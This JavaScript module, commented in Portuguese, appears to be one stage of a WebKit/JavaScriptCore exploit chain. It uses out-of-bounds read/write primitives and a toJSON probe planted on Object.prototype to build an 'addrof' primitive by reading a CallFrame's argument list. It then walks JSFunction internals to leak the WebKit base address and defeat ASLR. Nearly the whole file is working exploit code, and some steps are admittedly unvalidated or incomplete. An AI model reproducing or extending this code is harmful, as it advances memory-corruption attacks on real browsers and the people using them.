// js/script3/testArrayBufferVictimCrash.mjs (v83 - Addrof via CallFrame)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    arb_write, // Embora não usado na nova addrof, é bom para o leak
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // <<< IMPORTANTE: Depende do config.mjs atualizado

// O nome do módulo foi atualizado para refletir a nova técnica
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CALLFRAME = "Heisenbug_TypedArrayAddrof_v83_CallFrame";

const VICTIM_BUFFER_SIZE = 256; 
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES = [0xABABABAB]; 

// Constantes para a nova primitiva addrof
const CALLFRAME_ARGS_PTR_OFFSET = JSC_OFFSETS.CallFrame.ARGUMENTS_POINTER_OFFSET; // 0x28
const FIRST_ARG_OFFSET_IN_LIST = 0x0; // O primeiro argumento está no offset 0 da lista

// Variável para armazenar o resultado da nossa nova primitiva
let leaked_address_via_callframe = null;
let targetObjectForAddrof = null;

// <<< MUDANÇA PRINCIPAL 1: Nova sonda toJSON que lê a memória do CallFrame >>>
function new_addrof_probe_via_CallFrame() {
    const FNAME_PROBE = "new_addrof_probe_via_CallFrame";
    try {
        // 'this' agora é um objeto JavaScript que está sobreposto 
        // ao CallFrame de 'victim_function' na memória.
        const callFrameObject = this;
        
        // 1. Ler o ponteiro para a lista de argumentos do CallFrame.
        const arguments_ptr = arb_read(callFrameObject.add(CALLFRAME_ARGS_PTR_OFFSET), 8);
        if (!isValidPointer(arguments_ptr, "args_ptr")) {
             logS3(`[${FNAME_PROBE}] Ponteiro de argumentos inválido: ${arguments_ptr.toString(true)}`, "error");
             return "probe_err_args_ptr";
        }
        logS3(`[${FNAME_PROBE}] Ponteiro da lista de argumentos lido: ${arguments_ptr.toString(true)}`, "leak");

        // 2. Ler o primeiro argumento da lista (que é nosso targetObjectForAddrof).
        const potential_addr = arb_read(arguments_ptr.add(FIRST_ARG_OFFSET_IN_LIST), 8);
        
        // 3. Validar e armazenar o ponteiro.
        if (isValidPointer(potential_addr, "leaked_ptr")) {
            leaked_address_via_callframe = potential_addr;
            logS3(`[${FNAME_PROBE}] SUCESSO! Endereço válido vazado: ${leaked_address_via_callframe.toString(true)}`, "vuln");
        } else {
            logS3(`[${FNAME_PROBE}] FALHA! Endereço vazado não é um ponteiro válido: ${potential_addr.toString(true)}`, "error");
        }

    } catch(e) {
        logS3(`[${FNAME_PROBE}] Erro na sonda: ${e.message}`, "critical");
    }
    
    return "probe_executed_callframe_read";
}

// <<< MUDANÇA PRINCIPAL 2: Nova função vítima para hospedar o CallFrame alvo >>>
async function trigger_and_leak_via_callframe(target_object, oob_write_value) {
    await triggerOOB_primitive({ force_reinit: true });
    
    oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, oob_write_value, 4);
    await PAUSE_S3(150);

    // O objeto que será corrompido para ser confundido com o CallFrame.
    // A técnica de "grooming" para garantir que ele seja alocado adjacente ao CallFrame
    // na memória é complexa e dependente do ambiente, mas a lógica geral é esta.
    let confused_ab_candidate = new ArrayBuffer(VICTIM_BUFFER_SIZE);

    // Gatilho final
    JSON.stringify({
        prop: {
            toJSON: new_addrof_probe_via_CallFrame
        }
    }, [target_object]); // Passamos o target_object aqui, mas o importante é que ele já é um argumento
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { 
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CALLFRAME;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof (CallFrame) + WebKit Base Leak (R83) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R83...`;

    targetObjectForAddrof = function someUniqueLeakFunctionR83_Instance() { return `target_R83_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetObjectForAddrof) recriada.`, 'info');

    logS3(`--- Fase 0 (R83): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
    logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    if (!coreOOBReadWriteOK) {
        return { errorOccurred: "Core OOB R/W Sanity Check FALHOU." };
    }
    await PAUSE_S3(100);

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, addrof_result: { success: false, msg: "Addrof (R83): Not run." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R83): Not run." },
        oob_value_used: null,
    };
    
    // <<< MUDANÇA PRINCIPAL 3: Loop principal agora usa a nova função e sonda >>>
    for (const current_oob_value of OOB_WRITE_VALUES) {
        leaked_address_via_callframe = null; 
        const current_oob_hex_val = toHex(current_oob_value);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION R83: OOB Write Value: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let iter_addrof_result = { success: false, msg: `Addrof (R83): Not triggered in this iter for ${current_oob_hex_val}.`, leaked_object_addr: null };
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R83): Not run in this iter." };
        let iter_primary_error = null;

        try {
            logS3(`  --- Fase 1 (R83): Detecção de TC e Addrof via CallFrame ---`, "subtest", FNAME_CURRENT_ITERATION);
            
            // Definir a sonda. Ela será chamada dentro de `trigger_and_leak_via_callframe`.
            const ppKey = 'toJSON'; 
            let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); 
            let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: new_addrof_probe_via_CallFrame, writable: true, configurable: true, enumerable: false });
                polluted = true;
                
                // Chamar a função que encapsula o gatilho. O 'addrof' acontece aqui dentro.
                await trigger_and_leak_via_callframe(targetObjectForAddrof, current_oob_value);

            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }
            
            if (leaked_address_via_callframe) {
                iter_addrof_result.success = true;
                iter_addrof_result.msg = `Addrof (R83): Sucesso! Endereço da função vazado via CallFrame.`;
                iter_addrof_result.leaked_object_addr = leaked_address_via_callframe.toString(true);
                logS3(`  Addrof Sucesso: ${iter_addrof_result.msg} Addr: ${iter_addrof_result.leaked_object_addr}`, "vuln");
            } else {
                 iter_addrof_result.msg = `Addrof (R83): FALHA! A sonda foi executada, mas não conseguiu extrair um endereço válido.`;
                 logS3(`  ${iter_addrof_result.msg}`, "error");
            }
            
            logS3(`  --- Fase 1 (R83) Concluída. Addrof Sucesso: ${iter_addrof_result.success} ---`, "subtest");
            await PAUSE_S3(100);

            logS3(`  --- Fase 2 (R83): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (iter_addrof_result.success) {
                try {
                    const func_addr = leaked_address_via_callframe;
                    logS3(`  WebKitLeak: Endereço da função alvo (func_addr): ${func_addr.toString(true)}`, 'info');
                    
                    const ptr_to_executable_instance = await arb_read(func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
                    iter_webkit_leak_result.internal_ptr_stage1 = ptr_to_executable_instance.toString(true);
                     if (!isValidPointer(ptr_to_executable_instance, "_execInst")) throw new Error(`Ponteiro para ExecutableInstance inválido: ${iter_webkit_leak_result.internal_ptr_stage1}`);
                    logS3(`  WebKitLeak: Ponteiro para ExecutableInstance: ${ptr_to_executable_instance.toString(true)}`, 'leak');
                    
                    const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance.add(JSC_OFFSETS.JSFunction.SCOPE_OFFSET), 8); // Reutilizando um offset, idealmente seria validado um para JIT
                    iter_webkit_leak_result.internal_ptr_stage2 = ptr_to_jit_or_vm.toString(true);
                    if (!isValidPointer(ptr_to_jit_or_vm, "_jitVm")) throw new Error(`Ponteiro para JIT/VM inválido: ${iter_webkit_leak_result.internal_ptr_stage2}`);
                    logS3(`  WebKitLeak: Ponteiro para JIT/VM: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
                    
                    const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);   
                    const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb); 
                    
                    iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                    iter_webkit_leak_result.success = true;
                    iter_webkit_leak_result.msg = `WebKitLeak (R83): Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`;
                    logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

                } catch (e_webkit_leak) {
                    iter_webkit_leak_result.msg = `WebKitLeak (R83) EXCEPTION: ${e_webkit_leak.message || String(e_webkit_leak)}`;
                    logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error");
                    if (!iter_primary_error) iter_primary_error = e_webkit_leak;
                }
            } else {
                 iter_webkit_leak_result.msg = "WebKitLeak (R83): Pulado, pois o Addrof falhou.";
                 logS3(iter_webkit_leak_result.msg, "warn");
            }
        } catch (e_outer_iter) { 
            if (!iter_primary_error) iter_primary_error = e_outer_iter;
            logS3(`  ERRO CRÍTICO NA ITERAÇÃO R83: ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
        } finally {
            await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` });
        }

        const current_iter_summary = {
            oob_value: current_oob_hex_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            addrof_result_this_iter: iter_addrof_result,
            webkit_leak_result_this_iter: iter_webkit_leak_result,
        };
        iteration_results_summary.push(current_iter_summary);
        
        // Lógica para determinar o "melhor" resultado (simplesmente o primeiro sucesso, neste caso)
        if (!best_result_for_runner.errorOccurred && !current_iter_summary.error) {
             if (iter_webkit_leak_result.success || iter_addrof_result.success) {
                 best_result_for_runner.errorOccurred = null;
                 best_result_for_runner.oob_value_used = current_oob_hex_val;
                 best_result_for_runner.addrof_result = iter_addrof_result;
                 best_result_for_runner.webkit_leak_result = iter_webkit_leak_result;
             }
        }
        
        if (iter_webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R83: WebKitLeak OK!`;
        else if (iter_addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R83: Addrof OK`;
        else document.title = `${FNAME_CURRENT_TEST_BASE}_R83: Iter Done (${current_oob_hex_val})`;
        await PAUSE_S3(250);
    }
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    return { ...best_result_for_runner, iteration_results_summary };
}
